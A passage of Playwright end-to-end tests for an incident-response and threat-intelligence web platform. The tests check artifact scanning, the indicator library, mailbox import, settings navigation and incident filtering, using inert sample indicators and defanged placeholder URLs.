  expect((await download).suggestedFilename()).toMatch(/^nik-artifacts-\d{4}-\d{2}-\d{2}\.zip$/)
  await expect(dialog).toBeHidden()
  // An admin can bring an archive in.
  await panel.getByRole('button', { name: 'Import' }).click()
  await expect(page.getByRole('dialog', { name: 'Import artifacts' })).toContainText('Nothing is run')
  await page.keyboard.press('Escape')
  await page.getByRole('button', { name: 'Incidents', exact: true }).click()
})

test('an address is scanned on its own, then linked to the incident', async () => {
  if (process.env.E2E_BROWSER_URL) test.setTimeout(180_000)
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('button', { name: 'New analysis' }).click()
  const dialog = page.getByRole('dialog', { name: 'New analysis' })
  // Addresses on the organisation's network are refused before anything is opened.
  await dialog.getByLabel('or an address to scan').fill('http://192.168.1.10/admin')
  await dialog.getByRole('button', { name: 'Scan address' }).click()
  await expect(dialog.getByRole('alert')).toContainText('Not scanned')
  // Defanged text is understood.
  await dialog.getByLabel('or an address to scan').fill('hxxps://nik-e2e-scan[.]invalid/login')
  await dialog.getByRole('button', { name: 'Scan address' }).click()

  const artifact = page.getByRole('region', { name: 'Artifact' })
  await expect(artifact.getByRole('heading', { name: 'nik-e2e-scan.invalid/login' })).toBeVisible({ timeout: 30_000 })
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('nik-e2e-scan.invalid/login')
  if (process.env.E2E_BROWSER_URL) {
    // The isolated browser visited it: a verdict with its reasons, and the visit's capture.
    await expect(page.getByText('WHY THIS VERDICT')).toBeVisible({ timeout: 120_000 })
    await expect(page.getByText('HOW THE BROWSER GOT THERE')).toBeVisible()
    await expect(artifact).toContainText('browser session')
  } else {
    await expect(page.getByText('The address was not visited.', { exact: true })).toBeVisible({ timeout: 30_000 })
    await expect(page.getByText(/isolated browser is not configured/)).toBeVisible()
  }

  await artifact.getByRole('button', { name: 'Link to incident' }).click()
  await page
    .getByRole('dialog', { name: 'Link to incident' })
    .getByRole('button', { name: 'Link', exact: true })
    .click()
  await artifact.getByRole('button', { name: 'WKS-FINANCE-01 - m.rossi', exact: true }).click()
  await page
    .locator('nav[aria-label="Analysis tabs"]')
    .getByRole('button', { name: 'URL Analysis', exact: true })
    .click()
  await expect(page.getByRole('list', { name: 'Addresses' })).toContainText('nik-e2e-scan.invalid/login', {
    timeout: 20_000,
  })
  await page.getByRole('button', { name: 'Incidents', exact: true }).click()
})

test('right-click works on lists, indicators and artifacts', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const menu = page.getByRole('menu')

  // A sample in the incident's list: its own actions, and the flag.
  await tabs.getByRole('button', { name: 'Malware Analysis', exact: true }).click()
  const samples = page.getByRole('list', { name: 'Samples' })
  await samples.getByText('dropper.bin').click({ button: 'right' })
  await expect(menu).toContainText('Open as an artifact')
  await expect(menu).toContainText('Remove from the incident')
  await menu.getByRole('menuitem', { name: 'Flag the sample' }).click()
  await expect(samples.getByLabel('Flagged')).toHaveCount(1)

  // An indicator is flagged by hand from its menu, wherever it is shown.
  await tabs.getByRole('button', { name: 'IOCs', exact: true }).click()
  const address = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(address).toBeVisible({ timeout: 20_000 })
  // The list reloads after the flag above: a menu closes when the page moves under it.
  await page.waitForLoadState('networkidle')
  await address.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Flag the indicator' }).click()
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.locator('ol li', { hasText: '185.220.101.47' }).first()).toBeVisible()
  await expect(page.locator('ol li', { hasText: 'dropper.bin' }).first()).toBeVisible()
  // A flagged item on the Summary has the menu too.
  await page.locator('ol li', { hasText: 'dropper.bin' }).first().click({ button: 'right' })
  await expect(menu).toContainText('Remove the flag')
  await page.keyboard.press('Escape')

  // An artifact in the panel.
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('navigation', { name: 'Artifacts' }).getByText('dropper.bin').click({ button: 'right' })
  await expect(menu).toContainText('Copy link')
  await expect(menu).toContainText('Where else was this seen?')
  await page.keyboard.press('Escape')
  await page.getByRole('button', { name: 'Incidents', exact: true }).click()
})

test('pasted text is recognised: an address to scan, an indicator to look up', async () => {
  const paste = (text) =>
    page.evaluate((value) => {
      const data = new DataTransfer()
      data.setData('text/plain', value)
      document.body.dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true }))
    }, text)
  const prompt = page.getByRole('region', { name: 'Pasted text' })

  // Ordinary text is left alone.
  await paste('just some words')
  await expect(prompt).toHaveCount(0)

  // A defanged address: read as it was meant, opened only if the analyst chooses.
  await paste('hxxps://nik-e2e-scan[.]invalid/login')
  await expect(prompt).toContainText('URL')
  await expect(prompt).toContainText('https://nik-e2e-scan.invalid/login')
  await expect(prompt.getByRole('button', { name: 'Analyse URL' })).toBeVisible()
  await prompt.getByRole('button', { name: 'Dismiss' }).click()
  await expect(prompt).toHaveCount(0)

  // An indicator: search it, or see where it was seen.
  await paste('185.220.101[.]47')
  await expect(prompt).toContainText('IP address')
  await prompt.getByRole('button', { name: 'Search in Nik' }).click()
  const palette = page.getByRole('dialog', { name: 'Search' })
  await expect(palette.getByRole('textbox', { name: 'Search' })).toHaveValue('185.220.101.47')
  await page.keyboard.press('Escape')
  await paste('185.220.101.47')
  await prompt.getByRole('button', { name: 'Where seen' }).click()
  await expect(page.getByRole('dialog', { name: 'Indicator' })).toContainText('WKS-FINANCE-01')
  await page.keyboard.press('Escape')
})

test('the IoC library: paste many, group them in a list, export with chosen fields, plan a bulk check', async () => {
  const paste = (text) =>
    page.evaluate((value) => {
      const data = new DataTransfer()
      data.setData('text/plain', value)
      document.body.dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true }))
    }, text)

  // Several values pasted anywhere open "Add indicators" with what Nik read.
  await paste('203.0.113[.]77\nhxxps://nik-e2e-list[.]invalid/get.php\nnot an indicator\n10.12.0.4')
  const add = page.getByRole('dialog', { name: 'Add indicators' })
  const found = add.getByRole('region', { name: 'What Nik found' })
  await expect(found).toContainText('New indicators 3')
  await expect(found).toContainText('Not recognised show1')
  await expect(add.getByLabel('Indicators', { exact: true })).toHaveValue(/203\.0\.113\[\.\]77/)
  // A list is asked for, never assumed.
  await expect(add.getByRole('combobox').first()).toHaveValue('none')
  await add.getByRole('combobox').first().selectOption('new')
  await add.getByLabel('New list name').fill('E2E wave')
  await add.getByLabel('Check them when saved').uncheck()
  await add.getByRole('button', { name: 'Save 3 indicators' }).click()

  // The list opens on its own page, with an address to share.
  await expect(page).toHaveURL(/\/iocs\/lists\/[0-9a-f]{32}$/)
  const table = page.getByRole('table', { name: 'Indicators' })
  await expect(table.locator('tbody tr')).toHaveCount(3)
  await expect(table).toContainText('https://nik-e2e-list.invalid/get.php')
  await expect(table.locator('tbody tr', { hasText: '10.12.0.4' })).toContainText('never sent out')
  const panel = page.getByRole('complementary', { name: 'IoCs panel' })
  await expect(panel.getByRole('button', { name: /E2E wave/ })).toHaveAttribute('aria-current', 'true')
  const listUrl = page.url()

  // Columns sort on the server.
  await table.getByRole('button', { name: 'Value' }).click()
  await expect(table.locator('tbody tr').first()).toContainText('10.12.0.4')

  // Export: the main fields are ticked; the preview follows the choice.
  await page.getByRole('button', { name: 'Export', exact: true }).click()
  const exportDialog = page.getByRole('dialog', { name: /^Export · E2E wave/ })
  const preview = exportDialog.getByLabel('Export preview')
  await expect(preview).toContainText('type,value,verdict,score,tags,first_seen')
  await exportDialog.getByLabel('Lists').check()
  await exportDialog.getByLabel('Defang values').check()
  await expect(preview).toContainText('first_seen,lists')
  await expect(preview).toContainText('203[.]0[.]113[.]77')
  await exportDialog.getByRole('radio', { name: /^Text/ }).check({ force: true })
  await expect(preview).not.toContainText('first_seen')
  const download = page.waitForEvent('download')
  await exportDialog.getByRole('button', { name: /^Download e2e-wave\.txt/ }).click()
  expect((await download).suggestedFilename()).toBe('e2e-wave.txt')

  // Bulk check: what it costs is shown before anything is asked.
  await page.getByRole('button', { name: 'Check all 3' }).click()
  const check = page.getByRole('dialog', { name: /^Check 3 indicators/ })
  await expect(check).toContainText('Never sent out')
  await expect(check.getByRole('button', { name: 'Start' })).toBeVisible()
  await check.getByRole('button', { name: 'Cancel' }).click()

  // The whole library: the incident's indicators are there too, tinted by verdict only.
  await panel.getByRole('button', { name: /^All indicators/ }).click()
  await expect(page).toHaveURL(/\/iocs$/)
  await page.getByLabel('Filter indicators').fill('185.220.101.47')
  const attacker = table.locator('tbody tr', { hasText: '185.220.101.47' }).first()
  await expect(attacker).toContainText('incident')
  await expect(attacker).not.toHaveClass(/bg-high-soft/)

  // A file of indicators dropped anywhere is read as one, and can join a list.
  const transfer = await page.evaluateHandle(() => {
    const data = new DataTransfer()
    data.items.add(new File(['type,value,tags\nip,198.51.100.23,c2\ndomain,nik-e2e-feed.invalid,c2\n'], 'feed.csv'))
    return data
  })
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  await expect(add).toContainText('feed.csv')
  await expect(found).toContainText('CSV')
  await expect(found).toContainText('New indicators 2')
  await add.getByRole('combobox').first().selectOption({ label: 'Yes: add to "E2E wave"' })
  await add.getByLabel('Check them when saved').uncheck()
  await add.getByRole('button', { name: 'Save 2 indicators' }).click()
  await expect(page).toHaveURL(listUrl)
  await expect(table.locator('tbody tr')).toHaveCount(5)
  await expect(table.locator('tbody tr', { hasText: '198.51.100.23' })).toContainText('import')

  // The link alone opens the list; an incident leaves the library.
  await page.reload()
  await expect(page.getByRole('heading', { name: /E2E wave/ })).toBeVisible({ timeout: 20_000 })
  await page
    .getByRole('navigation', { name: 'Sections' })
    .getByRole('button', { name: 'Incidents', exact: true })
    .click()
  await page.getByRole('navigation', { name: 'Incidents' }).getByRole('button').first().click()
  await expect(page).toHaveURL(/\/incident\//)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('the page always follows the address: incident, artifact, library, indicator', async () => {
  const rail = page.getByRole('navigation', { name: 'Sections' })
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const library = page.getByRole('table', { name: 'Indicators' })
  const artifact = page.getByRole('region', { name: 'Artifact' })
  const palette = page.getByRole('dialog', { name: 'Search' })
  const indicator = page.getByRole('dialog', { name: 'Indicator' })
  const openLibrary = async () => {
    if (!(await page.getByRole('complementary', { name: 'IoCs panel' }).count()))
      await rail.getByRole('button', { name: /^IoC library/ }).click()
    await page
      .getByRole('complementary', { name: 'IoCs panel' })
      .getByRole('button', { name: /^All indicators/ })
      .click()
    await expect(page).toHaveURL(/\/iocs$/)
    await expect(library).toBeVisible()
  }
  /** What the main area shows must be what the address says. */
  const expectIncident = async () => {
    await expect(page).toHaveURL(/\/incident\//)
    await expect(tabs).toBeVisible()
    await expect(library).toHaveCount(0)
    await expect(artifact).toHaveCount(0)
  }

  // From the library, an incident found with the search.
  await openLibrary()
  await page.keyboard.press('ControlOrMeta+k')
  await palette.getByRole('textbox', { name: 'Search' }).fill('WKS-FINANCE')
  await palette
    .getByRole('option', { name: /WKS-FINANCE-01/ })
    .first()
    .click()
  await expectIncident()

  // From the library, "go to a tab" of the search.
  await openLibrary()
  await page.keyboard.press('ControlOrMeta+k')
  await palette.getByRole('textbox', { name: 'Search' }).fill('> timeline')
  await page.keyboard.press('Enter')
  await expectIncident()
  await expect(tabs.locator('[aria-current="page"]')).toContainText('Timeline')

  // From the library, the incident an indicator was seen in.
  await openLibrary()
  await page.getByLabel('Filter indicators').fill('185.220.101.47')
  await library.getByRole('button', { name: '185.220.101.47', exact: true }).first().click()
  await indicator
    .getByRole('region', { name: 'Seen in' })
    .getByRole('button', { name: 'Open', exact: true })
    .first()
    .click()
  await expect(indicator).toHaveCount(0)
  await expectIncident()

  // Library, then an artifact, then Back and Forward: each address shows its own page.
  await openLibrary()
  await rail.getByRole('button', { name: 'Artifacts', exact: true }).click()
  await page.getByRole('navigation', { name: 'Artifacts' }).getByRole('button').first().click()
  await expect(page).toHaveURL(/\/artifact\//)
  await expect(artifact).toBeVisible()
  await expect(library).toHaveCount(0)
  await page.goBack()
  await expect(page).toHaveURL(/\/iocs$/)
  await expect(library).toBeVisible()
  await expect(artifact).toHaveCount(0)
  await page.goForward()
  await expect(page).toHaveURL(/\/artifact\//)
  await expect(artifact).toBeVisible()
  await expect(library).toHaveCount(0)

  // From an artifact, an incident found with the search.
  await page.keyboard.press('ControlOrMeta+k')
  await palette.getByRole('textbox', { name: 'Search' }).fill('WKS-FINANCE')
  await palette
    .getByRole('option', { name: /WKS-FINANCE-01/ })
    .first()
    .click()
  await expectIncident()

  // An indicator's page over the library: back to a window keeps it open and restores the address.
  await openLibrary()
  await page.getByLabel('Filter indicators').fill('185.220.101.47')
  await library.getByRole('button', { name: '185.220.101.47', exact: true }).first().click()
  await indicator.getByRole('button', { name: 'Open as a page' }).click()
  await expect(page).toHaveURL(/\/ioc\/ip\?v=185\.220\.101\.47$/)
  await indicator.getByRole('button', { name: 'Back to a window' }).click()
  await expect(page).toHaveURL(/\/iocs$/)
  await expect(indicator).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(library).toBeVisible()

  // Back to the incident for the tests that follow.
  await rail.getByRole('button', { name: 'Incidents', exact: true }).click()
  await page.getByRole('navigation', { name: 'Incidents' }).getByRole('button').first().click()
  await expectIncident()
})

test('an indicator and the artifact that is its analysis lead to each other', async () => {
  const rail = page.getByRole('navigation', { name: 'Sections' })
  const artifact = page.getByRole('region', { name: 'Artifact' })
  const indicator = page.getByRole('dialog', { name: 'Indicator' })

  // The artifact as an indicator: its value and what the sources say about it.
  await rail.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel
    .getByRole('navigation', { name: 'Artifacts' })
    .getByRole('button', { name: /dropper\.bin/ })
    .click()
  await expect(artifact).toContainText('AS AN INDICATOR')
  await expect(artifact).toContainText(/Reputation: (not checked|\w+ \d+)/)

  // From the indicator back to the analysis Nik made of it.
  await artifact
    .getByRole('button', { name: /^[0-9a-f]{64}$/ })
    .first()
    .click()
  const analysed = indicator.getByRole('region', { name: 'Analysed by Nik' })
  await expect(analysed).toContainText('Analysis · what Nik saw')
  await expect(indicator).toContainText('Reputation · what the sources say')
  // The artifact is on its own or in the incident: either way "Seen in" names it.
  await expect(indicator.getByRole('region', { name: 'Seen in' })).toContainText(/dropper\.bin|file:/)
  await analysed.getByRole('button', { name: 'Open the analysis' }).click()
  await expect(indicator).toHaveCount(0)
  await expect(page).toHaveURL(/\/artifact\/file-[0-9a-f]{64}$/)
  await expect(artifact.getByRole('heading', { name: 'dropper.bin' })).toBeVisible()

  // An address not analysed yet: the page and the right-click menu offer to analyse it.
  await rail.getByRole('button', { name: /^IoC library/ }).click()
  const library = page.getByRole('table', { name: 'Indicators' })
  await page
    .getByRole('complementary', { name: 'IoCs panel' })
    .getByRole('button', { name: /^Addresses to analyse/ })
    .click()
  await expect(library.locator('tbody tr').first()).toContainText('not analysed')
  const address = library.getByRole('button', { name: /^https?:\/\// }).first()
  await address.click({ button: 'right' })
  await expect(page.getByRole('menu').getByRole('menuitem', { name: /^Analyse URL/ })).toBeVisible()
  await page.keyboard.press('Escape')
  await address.click()
  await expect(indicator.getByRole('region', { name: 'Analysed by Nik' })).toContainText('Not analysed by Nik yet')
  await expect(indicator.getByRole('button', { name: 'Analyse URL' })).toBeVisible()
  await page.keyboard.press('Escape')

  // Several at once: what would be visited is shown first, and nothing is visited until confirmed.
  await page.getByLabel('Select the page').check()
  await page.getByRole('region', { name: 'Selection' }).getByRole('button', { name: 'Analyse addresses' }).click()
  const plan = page.getByRole('dialog', { name: 'Analyse addresses' })
  await expect(plan).toContainText('A visit is seen by the site')
  await expect(plan.getByRole('button', { name: /^Visit \d+ address/ })).toBeVisible()
  await plan.getByRole('button', { name: 'Cancel' }).click()

  await rail.getByRole('button', { name: 'Incidents', exact: true }).click()
  await page.getByRole('navigation', { name: 'Incidents' }).getByRole('button').first().click()
  await expect(page).toHaveURL(/\/incident\//)
})

test('a mailbox is indexed, its messages imported, and its conversations drawn as a graph', async () => {
  test.setTimeout(180_000)
  const rail = page.getByRole('navigation', { name: 'Sections' })
  const artifact = page.getByRole('region', { name: 'Artifact' })
  const mail = (id, subject, from, date, reply) =>
    [
      'From sender@example.org Tue Nov 10 08:31:00 2026',
      `From: ${from}`,
      'To: finance@example.org',
      `Subject: ${subject}`,
      `Date: ${date}`,
      `Message-ID: <${id}@nik-e2e.example>`,
      ...(reply ? [`In-Reply-To: <${reply}@nik-e2e.example>`] : []),
      '',
      'Please see the invoice.',
      '>From the accounts team',
      '',
    ].join('\n')
  const mbox = [
    mail('q1', 'Quarterly invoice', 'billing@nik-e2e-vendor.example', 'Tue, 10 Nov 2026 08:31:00 +0000'),
    mail('q2', 'Re: Quarterly invoice', 'finance@example.org', 'Wed, 11 Nov 2026 09:00:00 +0000', 'q1'),
    mail('q3', 'Fwd: Quarterly invoice', 'colleague@example.org', 'Wed, 11 Nov 2026 10:00:00 +0000', 'q1'),
  ].join('\n')

  // Dropped anywhere, an mbox becomes a mailbox artifact: indexed, nothing analysed yet.
  const transfer = await page.evaluateHandle((text) => {
    const data = new DataTransfer()
    data.items.add(new File([text], 'team.mbox'))
    return data
  }, mbox)
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  await expect(page).toHaveURL(/\/artifact\/mailbox-[0-9a-f]{32}$/, { timeout: 30_000 })
  await expect(artifact).toContainText('team.mbox')
  await expect(artifact).toContainText('Nothing imported yet', { timeout: 30_000 })
  await expect(artifact).toContainText('0 of 3 messages imported')

  // The import says what it will take before taking it.
  await artifact.getByRole('button', { name: 'Import messages' }).first().click()
  const dialog = page.getByRole('dialog', { name: 'Import from team.mbox' })
  await expect(dialog.getByRole('status', { name: 'Import plan' })).toContainText('3 messages match')
  await dialog.getByLabel('Sender or domain').fill('nik-e2e-vendor.example')
  await expect(dialog.getByRole('status', { name: 'Import plan' })).toContainText(
    '1 message matches · 3 with their conversations',
  )
  await dialog.getByRole('button', { name: 'Import 3 messages' }).click()

  // The graph: a row per message, newest first, each imported one with its verdict.
  const rows = artifact.getByRole('list', { name: 'Messages' }).getByRole('listitem')
  await expect(rows).toHaveCount(3, { timeout: 120_000 })
  await expect(artifact).toContainText('3 of 3 messages imported', { timeout: 120_000 })
  await expect(rows.first()).toContainText('Fwd: Quarterly invoice')
  await expect(rows.last()).toContainText('Quarterly invoice')
  await expect(rows.last()).not.toContainText('not imported')

  // A row shows the message and what it answers; the e-mail opens as its own artifact.
  await rows
    .nth(1)
    .getByRole('button', { name: /Re: Quarterly invoice/ })
    .click()
  const detail = artifact.getByRole('complementary', { name: 'Message' })
  await expect(detail).toContainText('finance@example.org')
  await expect(detail.getByRole('button', { name: 'Quarterly invoice', exact: true })).toBeVisible()
  await detail.getByRole('button', { name: 'Open the e-mail' }).click()
  await expect(page).toHaveURL(/\/artifact\/mail-[0-9a-f]{64}$/)
  await page.goBack()
  await expect(page).toHaveURL(/\/artifact\/mailbox-[0-9a-f]{32}$/)
  await expect(rows).toHaveCount(3)

  // All of them, or the ticked ones, go in an incident.
  await rows.first().getByRole('checkbox').check()
  await artifact.getByRole('button', { name: 'Put 1 in an incident' }).click()
  const link = page.getByRole('dialog', { name: 'Put messages in an incident' })
  await expect(link).toContainText('Only the phishing and suspicious ones add indicators')
  await link.getByRole('button', { name: 'Put the 1 selected' }).click()
  await expect(page.getByText(/1 message is in /)).toBeVisible()

  await rail.getByRole('button', { name: 'Incidents', exact: true }).click()
  await page.getByRole('navigation', { name: 'Incidents' }).getByRole('button').first().click()
  await expect(page).toHaveURL(/\/incident\//)
})

test('Storage shows how full the disk is and what fills it', async () => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Storage').click()
  await expect(settings.getByRole('img', { name: /% of the disk is used/ })).toBeVisible()
  const use = settings.getByRole('table', { name: 'Disk use' })
  await expect(use).toContainText('Mailboxes')
  await expect(use).toContainText('Database')
  await expect(use).toContainText('Everything else on the disk')
  await expect(settings.getByRole('list', { name: 'Largest objects' })).toContainText('team.mbox')
  await page.keyboard.press('Escape')
  await expect(settings).toBeHidden()
})

test('Settings is a page: every section has an address, Back leaves it, a link opens it', async () => {
  const before = new URL(page.url()).pathname
  const gear = page.getByRole('button', { name: 'Open platform settings' })
  await gear.click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await expect(page).toHaveURL(/\/settings\/analysis\/detection-rules$/)
  // The sections are in groups; the one shown is marked.
  await expect(sections.getByRole('group')).toHaveCount(7)
  await expect(sections.getByRole('group', { name: 'Rule sets' }).getByRole('button')).toHaveText([
    'YARA rules',
    'capa rules',
    'FLIRT signatures',
  ])
  await expect(sections.getByRole('button', { name: 'Detection rules' })).toHaveAttribute('aria-current', 'page')
  // The rail shows the page is open; what was open under it is not shown.
  await expect(page.getByRole('button', { name: 'Close platform settings' })).toHaveAttribute('aria-pressed', 'true')
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeHidden()

  // The box narrows the sections by name and by keyword.
  const find = settings.getByRole('searchbox', { name: 'Find a setting' })
  await find.fill('password')
  await expect(sections.getByRole('button')).toHaveText(['My account'])
  await find.fill('restore')
  await expect(sections.getByRole('button')).toHaveText(['Backup'])
  await find.fill('zzz')
  await expect(sections.getByRole('status')).toContainText('No section matches')
  await find.fill('')

  // A section has its address; the full backup is one of them.
  await sections.getByRole('button', { name: 'Backup' }).click()
  await expect(page).toHaveURL(/\/settings\/system\/backup$/)
  await expect(settings.getByRole('button', { name: 'Export full backup' })).toBeVisible()
  await sections.getByRole('button', { name: 'Audit log' }).click()
  await expect(page).toHaveURL(/\/settings\/system\/audit-log$/)

  // Back leaves the page in one step, wherever one went inside it; Forward returns to the section.
  await page.goBack()
  await expect(settings).toHaveCount(0)
  expect(new URL(page.url()).pathname).toBe(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
  await page.goForward()
  await expect(settings.getByRole('heading', { name: 'Audit log', level: 2 })).toBeVisible()

  // The address is a link: a reload stays on the section.
  await page.reload()
  await expect(settings.getByRole('heading', { name: 'Audit log', level: 2 })).toBeVisible()
  await expect(sections.getByRole('button', { name: 'Audit log' })).toHaveAttribute('aria-current', 'page')
  // An older or shortened address still opens the page.
  await page.goto('/settings/accounts')
  await expect(settings.getByRole('heading', { name: 'Accounts', level: 2 })).toBeVisible()

  // Closing a page opened by its link goes to the start; an entry of the rail leaves it too.
  await settings.getByRole('button', { name: 'Close settings' }).click()
  await expect(settings).toHaveCount(0)
  await gear.click()
  await page.getByRole('navigation', { name: 'Sections' }).getByRole('button', { name: 'Incidents' }).click()
  await expect(settings).toHaveCount(0)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('an incident has a status and an assignee, set from the panel and filtered there', async () => {
  const panel = page.locator('aside[aria-label="Incidents panel"]')
  const list = panel.locator('nav[aria-label="Incidents"]')
  const row = list.locator('li', { hasText: 'WKS-FINANCE-01' })
  const menu = page.getByRole('menu')

  // From the right-click menu of the panel.
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Assign to me' }).click()
  await expect(row).toContainText('@admin')
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Mark as in progress' }).click()
  await expect(row).toContainText('in progress')

  // The Summary shows the same and saves a change; the header follows.
  await row.getByRole('button').first().click()
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.locator('#incident-status')).toHaveValue('in_progress')
  await expect(page.locator('#incident-assignee')).toHaveValue('admin')
  await expect(page.getByRole('banner')).toContainText('assigned to admin')
  await page.locator('#incident-status').selectOption('closed')
  await page.getByRole('button', { name: 'Save', exact: true }).click()
  // Closing asks how: a reason among those of the incident's type, and notes.
  const closing = page.getByRole('dialog', { name: 'Close the incident' })
  await expect(closing).toContainText('Unclassified')
  await closing.locator('#close-reason').selectOption('False positive')
  await closing.locator('#close-notes').fill('A test of the scanner.')
  await closing.getByRole('button', { name: 'Close the incident' }).click()
  await expect(closing).toHaveCount(0)
  await expect(row).toContainText('closed')
  await expect(page.locator('#incident-status')).toHaveValue('closed')

  // The filters of the panel.
  await panel.getByLabel('Status filter').selectOption('open')
  await expect(row).toHaveCount(0)
  await panel.getByLabel('Status filter').selectOption('closed')
  await expect(row).toHaveCount(1)
  await panel.getByRole('button', { name: 'mine' }).click()
  await expect(row).toHaveCount(1)
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Remove the assignee (admin)' }).click()
  await expect(list).toContainText('No incident matches the filters.')
  await panel.getByRole('button', { name: 'mine' }).click()
  await panel.getByLabel('Status filter').selectOption('all')
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Mark as open' }).click()
  await expect(row).not.toContainText('closed')
})

test('a query filters the lists: typed, completed, built from rows; the filters write it', async () => {
  const panel = page.locator('aside[aria-label="Incidents panel"]')
  const list = panel.locator('nav[aria-label="Incidents"]')
  const filter = panel.getByRole('combobox', { name: 'Filter incidents' })
  const status = panel.getByLabel('Status filter')

  // Plain words, then a field with a wildcard: the server reads the query.
  await filter.fill('wks-finance')
  await expect(list.locator('li')).toHaveCount(1)
  await expect(list).toContainText('WKS-FINANCE-01')
  await filter.fill('host:nowhere-*')
  await expect(list).toContainText('No incident matches the filters.')
  await filter.fill('host:wks-* -host:nowhere')
  await expect(list).toContainText('WKS-FINANCE-01')

  // Autocomplete: the fields at the start of a condition, the values after the colon.
  await filter.fill('')
  await filter.pressSequentially('stat')
  const suggestions = panel.getByRole('listbox', { name: 'Suggestions' })
  await expect(suggestions.getByRole('option')).toHaveCount(1)
  await expect(suggestions.getByRole('option').first()).toContainText('status')
  await page.keyboard.press('Enter')
  await expect(filter).toHaveValue('status:')
  await expect(suggestions.getByRole('option')).toHaveText(['open', 'in_progress', 'closed'])
  await page.keyboard.press('ArrowDown')
  await page.keyboard.press('ArrowDown')
  await page.keyboard.press('Tab')
  await expect(filter).toHaveValue('status:closed ')
  await expect(filter).toBeFocused()
  // The status picker shows what the query says, and writes into it; so does "mine".
  await expect(status).toHaveValue('closed')
  await status.selectOption('open')
  await expect(filter).toHaveValue('status:open')
  await panel.getByRole('button', { name: 'mine' }).click()
  await expect(filter).toHaveValue(`status:open owner:${ADMIN.username}`)
  await expect(panel.getByRole('button', { name: 'mine' })).toHaveAttribute('aria-pressed', 'true')

  // The builder: the same query as rows; a change of a row rewrites the text.
  await panel.getByRole('button', { name: 'Query builder' }).click()
  await expect(panel.getByLabel('Condition 1: field')).toHaveValue('status')
  await expect(panel.getByLabel('Condition 2: field')).toHaveValue('owner')
  await panel.getByLabel('Condition 1: value').selectOption('closed')
  await expect(filter).toHaveValue(`status:closed owner:${ADMIN.username}`)
  await panel.getByRole('button', { name: 'Remove Condition 2' }).click()
  await expect(filter).toHaveValue('status:closed')
  await panel.getByRole('button', { name: 'Add a condition' }).click()
  await panel.getByLabel('Condition 2: field').selectOption('severity')
  await panel.getByLabel('Condition 2: operator').selectOption('>=')
  await panel.getByLabel('Condition 2: value').selectOption('high')
  await expect(filter).toHaveValue('status:closed severity:>=high')
  await panel.getByLabel('How the conditions combine').selectOption('or')
  await expect(filter).toHaveValue('status:closed or severity:>=high')
  // What it cannot show, it says; the text stays the query.
  await filter.fill('-(wks or srv)')
  await expect(panel.getByText('Edit it as text.')).toBeVisible()
  await panel.getByRole('button', { name: 'Query builder' }).click()

  // What cannot be read is said where it goes wrong, at once or by the server.
  await filter.fill('(status:open')
  await expect(panel.getByText('A parenthesis is not closed: add the closing )')).toBeVisible()
  await filter.fill('stauts:open')
  await expect(panel.getByText('"stauts" is not a field of incidents: did you mean "status"?')).toBeVisible()
  await expect(filter).toHaveAttribute('aria-invalid', 'true')
  await filter.fill('')
  await expect(filter).not.toHaveAttribute('aria-invalid', 'true')
  await expect(list).toContainText('WKS-FINANCE-01')

  // The artifacts: the same language; "mine" writes its condition.
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const artifacts = page.getByRole('complementary', { name: 'Artifacts panel' })
  const artifactFilter = artifacts.getByRole('combobox', { name: 'Filter artifacts' })
  await artifactFilter.fill('kind:file dropper')
  await expect(artifacts.getByRole('navigation', { name: 'Artifacts' })).toContainText('dropper.bin')
  await artifacts.getByRole('button', { name: 'mine' }).click()
  await expect(artifactFilter).toHaveValue(`kind:file dropper createdBy:${ADMIN.username}`)
  await artifactFilter.fill('kind:file size:<1')
  await expect(artifacts.getByRole('navigation', { name: 'Artifacts' })).toContainText(
    'No artifact matches these filters.',
  )
  await artifactFilter.fill('knid:file')
  await expect(artifacts.getByText('did you mean "kind"?')).toBeVisible()
  await artifactFilter.fill('')

  // The IoC library: its pickers write the query too.
  await page.getByRole('button', { name: /^IoC library/ }).click()
  await page
    .getByRole('complementary', { name: 'IoCs panel' })
    .getByRole('button', { name: /^All indicators/ })
    .click()
  const indicatorFilter = page.getByRole('combobox', { name: 'Filter indicators' })
  await indicatorFilter.fill('type:ip 185.220.*')
  await expect(page.locator('main tbody tr').first()).toContainText('185.220.101.47')
  await page.locator('main').getByRole('combobox').filter({ hasText: 'All types' }).selectOption('domain')
